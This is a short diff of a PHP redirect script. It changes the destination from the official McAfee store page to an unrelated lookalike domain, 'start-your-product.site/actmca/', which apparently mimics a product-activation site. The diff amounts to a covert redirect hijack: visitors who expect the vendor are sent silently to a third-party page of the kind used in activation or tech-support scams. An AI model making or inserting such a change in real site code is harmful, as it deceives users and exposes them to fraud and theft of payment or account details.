@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.mcafee.com/consumer/en-gb/store/m0/index.html");
+header("Location: https://start-your-product.site/actmca/");
 die();
 ?>
